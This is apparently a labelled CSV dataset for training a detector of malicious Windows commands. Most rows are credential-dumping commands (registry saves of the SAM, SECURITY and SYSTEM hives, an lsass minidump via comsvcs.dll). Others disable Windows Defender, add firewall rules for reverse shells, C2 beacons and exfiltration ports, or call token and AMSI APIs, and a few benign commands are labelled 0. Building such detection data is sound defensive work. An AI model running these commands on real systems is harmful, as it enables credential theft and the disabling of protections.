text,label
"cmd.exe /c ""reg export hklm\sam c:\temp\xckswyc1.dat""",1
reg  save  hklm\sam  c:\windows\temp\1s460iwq.save,1
rule: exfil data | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: 1337,2
"cmd.exe /c ""reg export hklm\security c:\temp\y019fq3l.dat""",1
"powershell -nop -c ""sc stop windefend""",2
"cmd.exe  /c  ""reg  save  hklm\security  c:\temp\idznqee9.dat""",1
reg export hklm\sam c:\windows\temp\sipn7peq.save,1
"cmd.exe /c ""reg   export   hklm\system   c:\windows\temp\kbp6c9cn.save""",1
rule: exfil data | app: any | dir: outbound | act: allow | port: 4444,2
reg save hklm\security c:\windows\temp\dlam9hww.save,1
"powershell -nop -c ""reg export hklm\security c:\windows\temp\wqtn1nr0.save""",1
reg export hklm\security c:\windows\temp\fxjhd2hx.save,1
reg export hklm\security c:\windows\temp\p5rwoytn.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\fnpcme4h.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\vopd6qwm.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\yslirwnn.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\jqhkowjo.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\2xdlhwv0.dat""",1
"cmd.exe /c ""rule: reverse shell | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 1337""",2
reg export hklm\system c:\windows\temp\xphlye20.save,1
reg export hklm\system c:\windows\temp\2kuvs8ze.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\fe0mdqti.dat""",1
rule:  exfil  data  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888,2
reg save hklm\security c:\windows\temp\1fsdei26.save,1
reg export hklm\system c:\windows\temp\ey75kjkd.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\byoyshf4.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\6li4kh2v.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\mtxew845.dat""",1
reg save hklm\sam c:\windows\temp\fm2efv3x.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\c1ihw2py.dat""",1
"netsh advfirewall firewall add rule name=""bad"" action=allow protocol=any port=4444",2
"powershell -nop -c ""powershell  -nop  -c  ""reg  save  hklm\sam  c:\temp\h8j4pzob.dat""""",1
"cmd.exe /c ""reg export hklm\security c:\temp\936ce460.dat""",1
"powershell -nop -c ""node  server.js  --port  3000""",0
"powershell -nop -c ""reg export hklm\sam c:\temp\knkwdiu5.dat""",1
"powershell   -nop   -c   ""reg   save   hklm\security   c:\temp\k7evvv13.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\zhdexzto.dat""",1
"cmd.exe /c ""$a   =   [ref].assembly.gettype('system.management.automation.openprocesstoken')""",3
reg save hklm\system c:\windows\temp\00vh3vl2.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\9ichc2wv.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\0z0cnpjv.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\z2xic72k.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\z964ylcu.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\h622f997.dat""",1
reg save hklm\security c:\windows\temp\b08qppy9.save,1
reg save hklm\sam c:\windows\temp\qy0ud3lv.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\1jkguh79.dat""",1
reg export hklm\sam c:\windows\temp\3c3hbion.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\mtnaps1o.dat""",1
"cmd.exe /c ""[dllimport(""advapi32.dll"")] extern bool amsiutils(...)""",3
reg save hklm\system c:\windows\temp\poxq8ul5.save,1
reg  export  hklm\system  c:\windows\temp\kvjmu10h.save,1
rule:   exfil   data   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   1337,2
"cmd.exe /c ""reg export hklm\security c:\temp\f8gkscnu.dat""",1
reg export hklm\system c:\windows\temp\a0nbqvg5.save,1
reg save hklm\system c:\windows\temp\82f57vhh.save,1
reg save hklm\security c:\windows\temp\pcu6v7ts.save,1
"cmd.exe /c ""cmd.exe   /c   ""reg   export   hklm\security   c:\temp\n0htgqef.dat""""",1
"cmd.exe /c ""reg export hklm\security c:\temp\n97g8w5b.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\rz4ay60s.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\edtmva88.dat""",1
reg save hklm\system c:\windows\temp\pig6pytw.save,1
reg export hklm\sam c:\windows\temp\7jimpgwi.save,1
reg export hklm\system c:\windows\temp\2xxureux.save,1
"powershell -nop -c ""reg  export  hklm\system  c:\windows\temp\wjx5s4sd.save""",1
reg export hklm\sam c:\windows\temp\7oghr6f5.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\di3f6m9f.dat""",1
reg export hklm\security c:\windows\temp\948l06e7.save,1
reg export hklm\security c:\windows\temp\7vzwu247.save,1
"cmd.exe /c ""rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\65un3l6u.dat""",1
reg save hklm\system c:\windows\temp\l0jjw404.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\zdtyy3f9.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\0hkrzrnq.dat""",1
"cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\xao6i5um.dat""",1
"cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\wcolgt9u.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\57vk60mn.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\q1qlo64g.dat""",1
whoami  /groups,0
reg export hklm\security c:\windows\temp\s03uj357.save,1
reg export hklm\security c:\windows\temp\xrxrstgu.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\aeupg2hh.dat""",1
reg save hklm\system c:\windows\temp\smqz00ko.save,1
reg export hklm\security c:\windows\temp\4zrm157p.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\mwaqiy1y.dat""",1
"[dllimport(""advapi32.dll"")]  extern  bool  amsiutils(...)",3
"powershell -nop -c ""reg export hklm\security c:\temp\jnu7u0a7.dat""",1
"powershell -nop -c ""$a  =  [ref].assembly.gettype('system.management.automation.duplicatetokenex')""",3
"cmd.exe /c ""reg export hklm\security c:\temp\gf065lgn.dat""",1
reg save hklm\system c:\windows\temp\p5v63j48.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\yf749ynm.dat""",1
"powershell -nop -c ""rundll32.exe   c:\windows\system32\comsvcs.dll,   minidump   1234   c:\temp\lsass.dmp   full""",1
"cmd.exe /c ""reg save hklm\security c:\temp\57n0wmel.dat""",1
reg save hklm\sam c:\windows\temp\oa8io4dr.save,1
reg save hklm\system c:\windows\temp\vd40zoxa.save,1
"cmd.exe /c ""reg   save   hklm\sam   c:\windows\temp\h0285158.save""",1
get-help  adjusttokenprivileges  -full,0
"powershell -nop -c ""reg save hklm\security c:\temp\cg3w55n7.dat""",1
"cmd.exe /c ""rule:  reverse  shell  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888""",2
reg export hklm\system c:\windows\temp\f5qnqm5s.save,1
rule: c2 beacon | app: any | dir: outbound | act: allow | port: 4444,2
"cmd.exe /c ""reg   save   hklm\sam   c:\windows\temp\hew50khu.save""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\3uy7pglc.dat""",1
"[dllimport(""advapi32.dll"")]  extern  bool  duplicatetokenex(...)",3
"cmd.exe /c ""reg export hklm\sam c:\temp\6bjbdgam.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\h14jbbsz.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\mn6lwoa7.dat""",1
reg save hklm\security c:\windows\temp\x4gxko9u.save,1
reg save hklm\security c:\windows\temp\c1qmek45.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\6b6dt600.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\8h49l990.dat""",1
reg export hklm\security c:\windows\temp\m9uu35vw.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\13mmm3c6.dat""",1
reg export hklm\system c:\windows\temp\b1pxv2rn.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\jufl2gpd.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\r9lgnac5.dat""",1
"powershell -nop -c ""node server.js --port 3000""",0
"cmd.exe /c ""reg save hklm\sam c:\temp\uw473c5v.dat""",1
reg save hklm\security c:\windows\temp\s247x65f.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\odju0myl.dat""",1
reg export hklm\sam c:\windows\temp\85nxfg73.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\knoka4v7.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\ik5so8t5.dat""",1
"cmd.exe /c ""reg   save   hklm\system   c:\windows\temp\ssm6lwyc.save""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\d2i6fkxm.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\i6ih7wgf.dat""",1
reg save hklm\system c:\windows\temp\ls18drep.save,1
"powershell -nop -c ""cmd.exe   /c   ""reg   export   hklm\security   c:\temp\iuobm5sz.dat""""",1
reg save hklm\sam c:\windows\temp\n2jh1rzj.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\75mwo0wm.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\c4ri7t7l.dat""",1
reg save hklm\system c:\windows\temp\5r3y2m3p.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\3rz227b4.dat""",1
reg save hklm\security c:\windows\temp\s1vqrwhn.save,1
"powershell  -nop  -c  ""reg  save  hklm\sam  c:\temp\qepymxoh.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\75fbx55l.dat""",1
reg export hklm\security c:\windows\temp\mdytorfe.save,1
reg export hklm\security c:\windows\temp\zxdrs72a.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\8g181105.dat""",1
reg save hklm\system c:\windows\temp\mnq5ujmf.save,1
"cmd.exe /c ""rule: exfil data | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: tcp 8888""",2
reg save hklm\system c:\windows\temp\lb5luxrs.save,1
reg save hklm\security c:\windows\temp\kq5piper.save,1
reg save hklm\security c:\windows\temp\txaklikm.save,1
reg save hklm\system c:\windows\temp\yy47z3og.save,1
"powershell -nop -c ""reg   export   hklm\system   c:\windows\temp\l69z390h.save""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\hp99ozxc.dat""",1
"cmd.exe /c ""reg  save  hklm\system  c:\windows\temp\lfc2r1gw.save""",1
reg export hklm\system c:\windows\temp\lw6v6ugr.save,1
reg export hklm\security c:\windows\temp\9jna0xac.save,1
reg export hklm\security c:\windows\temp\bdbfgi07.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\09fko9h7.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\6l1p69ss.dat""",1
reg save hklm\system c:\windows\temp\8mndqfxg.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\r63rsur0.dat""",1
reg save hklm\system c:\windows\temp\svrtua42.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\1g7bii8y.dat""",1
reg save hklm\security c:\windows\temp\f82tmgyq.save,1
"powershell -nop -c ""cmd.exe /c ""reg export hklm\security c:\temp\bjyrhuhe.dat""""",1
reg export hklm\security c:\windows\temp\eakbc4tp.save,1
"cmd.exe /c ""reg  export  hklm\security  c:\windows\temp\w81d83go.save""",1
reg export hklm\sam c:\windows\temp\6gdiqm4i.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\yelgswkp.dat""",1
rule: exfil data | app: any | dir: outbound | act: allow | port: tcp 8888,2
"cmd.exe   /c   ""reg   export   hklm\security   c:\temp\bpzzgdzd.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\7u6x8m0t.dat""",1
"powershell -nop -c ""reg export hklm\system c:\windows\temp\yzrvg5wm.save""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\438ncz7u.dat""",1
reg export hklm\system c:\windows\temp\wvxt5l62.save,1
"netsh  advfirewall  firewall  add  rule  name=""bad""  action=allow  protocol=any  port=4444",2
reg export hklm\system c:\windows\temp\5fcudn6b.save,1
"powershell -nop -c ""netsh   advfirewall   firewall   add   rule   name=""bad""   action=allow   protocol=any   port=4444""",2
sc stop windefend,2
"cmd.exe /c ""cmd.exe /c ""reg export hklm\security c:\temp\fvuruy5r.dat""""",1
"cmd.exe /c ""powershell   -nop   -c   ""reg   save   hklm\security   c:\temp\vd09xc5q.dat""""",1
reg save hklm\system c:\windows\temp\l41q15nv.save,1
reg save hklm\security c:\windows\temp\f2o3vcag.save,1
"cmd.exe /c ""reg export hklm\security c:\windows\temp\uywyf72n.save""",1
"powershell -nop -c ""reg export hklm\security c:\temp\ktk9quo9.dat""",1
"cmd.exe /c ""rule:   c2   beacon   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888""",2
reg export hklm\system c:\windows\temp\gyfcjt16.save,1
reg  export  hklm\security  c:\windows\temp\gqla8ftw.save,1
reg export hklm\sam c:\windows\temp\r22lgh94.save,1
"cmd.exe /c ""reg export hklm\system c:\windows\temp\w59ysngq.save""",1
reg export hklm\sam c:\windows\temp\8xw7morc.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\q3pgrnla.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\no7059ni.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\bsanqcn6.dat""",1
reg save hklm\sam c:\windows\temp\1w37clxt.save,1
"powershell   -nop   -c   ""reg   export   hklm\sam   c:\temp\0k35c2vs.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\5rrx903m.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\qil90evi.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\1qf56q2d.dat""",1
reg save hklm\system c:\windows\temp\ntq50nkp.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\to2f4jmx.dat""",1
reg export hklm\system c:\windows\temp\osznbe20.save,1
"cmd.exe /c ""powershell   -nop   -c   ""reg   save   hklm\security   c:\temp\xb2t6i5v.dat""""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\xqflxhtp.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\rev8cpuz.dat""",1
backup-utility write hklm\software to c:\backups\config.dat,0
reg export hklm\security c:\windows\temp\005ht5d7.save,1
sc  stop  windefend,2
reg export hklm\sam c:\windows\temp\8rj62biv.save,1
"powershell -nop -c ""[dllimport(""advapi32.dll"")] extern bool amsiutils(...)""",3
"cmd.exe /c ""reg export hklm\security c:\temp\s4mn1zgr.dat""",1
reg export hklm\sam c:\windows\temp\qbob9wvm.save,1
"powershell -nop -c ""get-help adjusttokenprivileges -full""",0
reg export hklm\security c:\windows\temp\6uxhv2ff.save,1
reg export hklm\system c:\windows\temp\kxu89trr.save,1
reg save hklm\security c:\windows\temp\al78abfj.save,1
"cmd.exe /c ""cmd.exe  /c  ""reg  save  hklm\security  c:\temp\d6j5i6c6.dat""""",1
reg export hklm\security c:\windows\temp\otpeeebx.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\tjjoub5u.dat""",1
reg export hklm\system c:\windows\temp\906x2w0a.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\qhzh4n3s.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\8dmd976k.dat""",1
reg save hklm\security c:\windows\temp\9a6filp9.save,1
reg save hklm\sam c:\windows\temp\hwlux1b6.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\lhcin32c.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\6e9tylba.dat""",1
reg export hklm\system c:\windows\temp\gsr3irob.save,1
"cmd.exe /c ""reg   export   hklm\security   c:\windows\temp\50wy9ngi.save""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\wotc4hp9.dat""",1
"powershell -nop -c ""reg export hklm\security c:\windows\temp\n5ecerze.save""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\7j7nrvr9.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\ozmwns54.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\id8j3u0z.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\o8y3fj6z.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\19bpalo9.dat""",1
"powershell -nop -c ""rule:  c2  beacon  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888""",2
"cmd.exe /c ""reg export hklm\security c:\temp\n1lstcw4.dat""",1
reg export hklm\sam c:\windows\temp\kwq26ghv.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\sgn63osm.dat""",1
"cmd.exe /c ""reg  export  hklm\sam  c:\windows\temp\se20hhqm.save""",1
"powershell -nop -c ""python  -m  http.server  8080""",0
reg save hklm\system c:\windows\temp\2g02hy22.save,1
reg export hklm\security c:\windows\temp\uxul7cqx.save,1
rule: reverse shell | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: tcp 8888,2
"cmd.exe /c ""reg save hklm\security c:\temp\o7iukw10.dat""",1
reg  export  hklm\sam  c:\windows\temp\65g3u9l7.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\jwec7jis.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\jw1meqts.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\6imwt94r.dat""",1
reg save hklm\security c:\windows\temp\zyrq6msh.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\e2l1gf3h.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\d4z18zcq.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\g92f6cy7.dat""",1
"cmd.exe /c ""cmd.exe   /c   ""reg   export   hklm\sam   c:\temp\kj5n5x8z.dat""""",1
"powershell -nop -c ""rule:   c2   beacon   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
"cmd.exe /c ""reg   export   hklm\security   c:\windows\temp\nowwg0hd.save""",1
"powershell -nop -c ""java   -jar   application.jar""",0
"cmd.exe /c ""backup-utility  save  registry  config""",0
"cmd.exe /c ""reg save hklm\security c:\temp\0q9ygcx1.dat""",1
reg save hklm\sam c:\windows\temp\w1p46h2i.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\li99gfas.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\hj8cq1gk.dat""",1
reg save hklm\sam c:\windows\temp\g1lae505.save,1
reg export hklm\sam c:\windows\temp\x9ubcvqj.save,1
"cmd.exe /c ""rule:   reverse   shell   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   1337""",2
"cmd.exe /c ""reg export hklm\security c:\temp\l42owxth.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\opnmww11.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\vz4bw0t3.dat""",1
"powershell -nop -c ""cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\43ggcdr9.dat""""",1
reg export hklm\system c:\windows\temp\6m0sfbh9.save,1
"powershell -nop -c ""rule:   exfil   data   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
reg save hklm\system c:\windows\temp\3jftuj8o.save,1
reg save hklm\security c:\windows\temp\r4gd81zs.save,1
reg save hklm\security c:\windows\temp\308n6nxq.save,1
"cmd.exe /c ""set-mppreference   -disablerealtimemonitoring   $true""",2
reg export hklm\security c:\windows\temp\p6izr9rv.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\wamdjeru.dat""",1
reg export hklm\system c:\windows\temp\lfqv8jpn.save,1
reg save hklm\security c:\windows\temp\umoti1a7.save,1
"cmd.exe /c ""rule:   exfil   data   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888""",2
"cmd.exe /c ""reg export hklm\sam c:\temp\o9zldo10.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\uuevw6fj.dat""",1
"powershell -nop -c ""rundll32.exe  c:\windows\system32\comsvcs.dll,  minidump  1234  c:\temp\lsass.dmp  full""",1
reg save hklm\system c:\windows\temp\jvkhavo8.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\qr925wfi.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\upyrljmn.dat""",1
"cmd.exe /c ""powershell   -nop   -c   ""reg   save   hklm\sam   c:\temp\24ez7ui0.dat""""",1
reg export hklm\security c:\windows\temp\d8j751un.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\lidf06tt.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\qe6ccm02.dat""",1
reg export hklm\security c:\windows\temp\lq3h89mk.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\ez1pidt5.dat""",1
"cmd.exe /c ""backup-utility   save   registry   config""",0
"cmd.exe /c ""reg save hklm\security c:\temp\ta460np2.dat""",1
"powershell -nop -c ""rule:   reverse   shell   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
reg export hklm\system c:\windows\temp\khcxzwhd.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\v1nlf5b1.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\rknrwjyt.dat""",1
reg save hklm\sam c:\windows\temp\som8fjso.save,1
"cmd.exe /c ""cmd.exe   /c   ""reg   export   hklm\security   c:\temp\hft81f9b.dat""""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\xaeip5up.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\tkorl5gu.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\s40g81xh.dat""",1
reg export hklm\security c:\windows\temp\gpmtl3ee.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\2aqlq6az.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\glkgolk4.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\bu741ybq.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\mcpkw8dh.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\rfayt0us.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\i42zalul.dat""",1
reg save hklm\security c:\windows\temp\qw3ska9v.save,1
"powershell -nop -c ""reg   save   hklm\security   c:\windows\temp\o2lxe52e.save""",1
reg export hklm\sam c:\windows\temp\a17sgoiw.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\7kym6mc1.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\0yu73swn.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\eq8rddw2.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\vs2rec0p.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\6lu8oiqd.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\pm0fklon.dat""",1
reg save hklm\sam c:\windows\temp\6mw1x84r.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\229ngigg.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\o7jkzxy8.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\bifogdoe.dat""",1
"powershell  -nop  -c  ""reg  export  hklm\security  c:\temp\k6xxq7o8.dat""",1
reg save hklm\sam c:\windows\temp\27vdvs5v.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\vc1hqw83.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\l2zw5bro.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\kh34prbi.dat""",1
"powershell -nop -c ""rule:  exfil  data  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888""",2
reg  export  hklm\security  c:\windows\temp\o0gxtm9n.save,1
"powershell -nop -c ""$a = [ref].assembly.gettype('system.management.automation.openprocesstoken')""",3
"powershell -nop -c ""reg   export   hklm\system   c:\windows\temp\rsgs7bpf.save""",1
"cmd.exe /c ""reg save hklm\security c:\temp\xajce5ur.dat""",1
reg export hklm\sam c:\windows\temp\467e4eri.save,1
reg export hklm\security c:\windows\temp\ci8moyl7.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\ju9rz7pw.dat""",1
"cmd.exe /c ""powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\2xpz1ksu.dat""""",1
reg save hklm\sam c:\windows\temp\qzrv2rhl.save,1
reg export hklm\sam c:\windows\temp\lywj2cxq.save,1
"powershell -nop -c ""reg export hklm\sam c:\windows\temp\la9mrc49.save""",1
reg export hklm\security c:\windows\temp\a9mq2bb5.save,1
reg export hklm\system c:\windows\temp\posj471b.save,1
reg save hklm\system c:\windows\temp\joughd9o.save,1
rule: c2 beacon | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: 4444,2
"powershell -nop -c ""reg save hklm\security c:\temp\op7cnyvr.dat""",1
reg save hklm\system c:\windows\temp\uks4xr5c.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\reqgp68h.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\r968x5vh.dat""",1
reg export hklm\security c:\windows\temp\vohjupd8.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\rmrj8urg.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\34z80wuy.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\dy3detqt.dat""",1
reg save hklm\sam c:\windows\temp\z0dfz2rp.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\gfpq8zym.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\7m09tvkm.dat""",1
reg save hklm\sam c:\windows\temp\kdvklfzb.save,1
reg save hklm\system c:\windows\temp\pyn2oy6j.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\1lijmby6.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\tg9mjgeq.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\tsbecn57.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\l0i932y6.dat""",1
reg save hklm\sam c:\windows\temp\tsi9bg12.save,1
reg export hklm\sam c:\windows\temp\y21mk6fh.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\6x51uga9.dat""",1
reg export hklm\security c:\windows\temp\9if55zjm.save,1
reg save hklm\sam c:\windows\temp\xuwo20m5.save,1
"cmd.exe /c ""reg  export  hklm\sam  c:\windows\temp\gunf7j73.save""",1
"powershell -nop -c ""java  -jar  application.jar""",0
"cmd.exe /c ""reg export hklm\sam c:\temp\ldrp5ezd.dat""",1
reg save hklm\security c:\windows\temp\lei4o1xr.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\oaidptm8.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\la0mun4j.dat""",1
reg save hklm\security c:\windows\temp\rxy0sqam.save,1
"powershell  -nop  -c  ""reg  export  hklm\security  c:\temp\prsxl8nq.dat""",1
reg export hklm\system c:\windows\temp\c5wlgj5b.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\juchjuk8.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\cy32oq6b.dat""",1
java   -jar   application.jar,0
"cmd.exe /c ""reg save hklm\sam c:\temp\oeuq5jbx.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\lchbiu2f.dat""",1
reg export hklm\system c:\windows\temp\n50i7lw4.save,1
"powershell -nop -c ""reg save hklm\sam c:\windows\temp\kb6d3bpt.save""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\7ztju3y0.dat""",1
